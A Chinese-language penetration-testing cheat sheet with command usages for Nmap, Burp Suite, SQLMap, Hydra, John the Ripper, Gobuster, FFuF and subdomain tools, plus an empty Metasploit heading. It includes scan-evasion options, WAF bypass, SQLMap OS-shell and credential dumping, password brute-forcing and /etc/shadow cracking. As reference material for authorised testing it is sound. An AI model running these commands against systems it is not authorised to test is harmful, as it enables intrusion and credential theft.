# 渗透测试工具使用

## Nmap - 网络扫描

### 基础扫描

```bash
nmap 192.168.1.1
nmap 192.168.1.1-100
nmap 192.168.1.0/24
nmap -iL targets.txt

nmap -sn 192.168.1.0/24
nmap -sP 192.168.1.0/24
```

### 端口扫描

```bash
nmap -p 80,443,8080 192.168.1.1
nmap -p 1-65535 192.168.1.1
nmap -p- 192.168.1.1
nmap -sU -p 53,161 192.168.1.1
nmap -sS -p- 192.168.1.1
nmap -sT -p 80,443 192.168.1.1
```

### 服务与版本检测

```bash
nmap -sV 192.168.1.1
nmap -sV --version-intensity 5 192.168.1.1
nmap -sC 192.168.1.1
nmap -sV -sC 192.168.1.1
nmap -O 192.168.1.1
nmap -A 192.168.1.1
```

### NSE 脚本

```bash
nmap --script vuln 192.168.1.1
nmap --script http-enum 192.168.1.1
nmap --script http-headers 192.168.1.1
nmap --script ssl-heartbleed 192.168.1.1
nmap --script smb-vuln* 192.168.1.1
nmap --script dns-brute example.com
nmap --script auth-brute 192.168.1.1
```

### 规避技术

```bash
nmap -f 192.168.1.1
nmap -D RND:10 192.168.1.1
nmap -S spoofed_ip 192.168.1.1
nmap --source-port 53 192.168.1.1
nmap -T1 192.168.1.1
nmap --data-length 32 192.168.1.1
```

## Burp Suite - Web 渗透

### 代理配置

1. 浏览器设置代理 → 127.0.0.1:8080
2. 安装 Burp CA 证书（HTTPS 拦截）
3. Proxy → Intercept → 开启/关闭拦截

### 常用模块

| 模块 | 用途 |
|------|------|
| Proxy | 拦截和修改请求/响应 |
| Repeater | 手动重放请求 |
| Intruder | 自动化攻击（暴力破解/fuzz） |
| Decoder | 编码/解码工具 |
| Comparer | 对比两个请求/响应 |
| Scanner | 自动漏洞扫描（Pro版） |

### Intruder 攻击类型

| 类型 | 描述 |
|------|------|
| Sniper | 单参数逐一替换 |
| Battering ram | 所有参数使用同一字典 |
| Pitchfork | 多参数一一对应 |
| Cluster bomb | 多参数笛卡尔积 |

### 常用操作

```
1. 拦截登录请求 → Send to Intruder
2. 标记密码参数
3. 加载密码字典
4. 设置匹配规则（如 "Invalid password" vs "Welcome"）
5. Start attack
6. 分析结果（按长度/状态码排序）
```

## SQLMap - SQL 注入

### 基础用法

```bash
sqlmap -u "http://example.com/page?id=1"
sqlmap -u "http://example.com/page?id=1" --dbs
sqlmap -u "http://example.com/page?id=1" -D dbname --tables
sqlmap -u "http://example.com/page?id=1" -D dbname -T users --columns
sqlmap -u "http://example.com/page?id=1" -D dbname -T users -C username,password --dump
```

### POST 请求

```bash
sqlmap -u "http://example.com/login" --data="user=admin&pass=test"
sqlmap -u "http://example.com/api" --data='{"id":1}' --method=POST
```

### 从请求文件

```bash
sqlmap -r request.txt
```

### 高级选项

```bash
sqlmap -u "http://example.com/page?id=1" --level=5 --risk=3
sqlmap -u "http://example.com/page?id=1" --technique=BEUSTQ
sqlmap -u "http://example.com/page?id=1" --os-shell
sqlmap -u "http://example.com/page?id=1" --cookie="session=abc123"
sqlmap -u "http://example.com/page?id=1" --random-agent
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment
sqlmap -u "http://example.com/page?id=1" --batch
sqlmap -u "http://example.com/page?id=1" --threads=5
```

### 绕过 WAF

```bash
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment,between,randomcase
sqlmap -u "http://example.com/page?id=1" --proxy="http://proxy:8080"
sqlmap -u "http://example.com/page?id=1" --delay=2
```

## Metasploit - 漏洞利用


## 其他常用工具

### Dirsearch / Gobuster - 目录扫描

```bash
dirsearch -u https://example.com -e php,html,js
dirsearch -u https://example.com -w /usr/share/wordlists/dirb/big.txt

gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dns -d example.com -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt
gobuster vhost -u https://example.com -w vhosts.txt
```

### Hydra - 暴力破解

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
hydra -l admin -P passwords.txt http-post-form://example.com:80 "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -L users.txt -P passwords.txt mysql://192.168.1.1
hydra -l admin -P passwords.txt ftp://192.168.1.1
```

### John the Ripper - 密码破解

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=raw-sha256 hash.txt
john --format=bcrypt hash.txt
john --show hash.txt
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt
```

### Subfinder - 子域名枚举

```bash
subfinder -d example.com -o subs.txt
subfinder -d example.com -silent -o subs.txt
subfinder -dL domains.txt -o all_subs.txt
```

### Amass - 攻击面映射

```bash
amass enum -d example.com
amass enum -passive -d example.com
amass intel -whois -d example.com
amass viz -d3 -d example.com
```

### FFuF - Fuzz 工具

```bash
ffuf -u https://example.com/FUZZ -w wordlist.txt
ffuf -u https://example.com/FUZZ -w wordlist.txt -fc 404
ffuf -u https://example.com/FUZZ -w wordlist.txt -mc 200,301
ffuf -u https://example.com -H "Host: FUZZ.example.com" -w subdomains.txt
ffuf -u https://example.com/api/FUZZ -w api_words.txt -mc 200,403
ffuf -u https://example.com/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt -fr "Invalid"
```
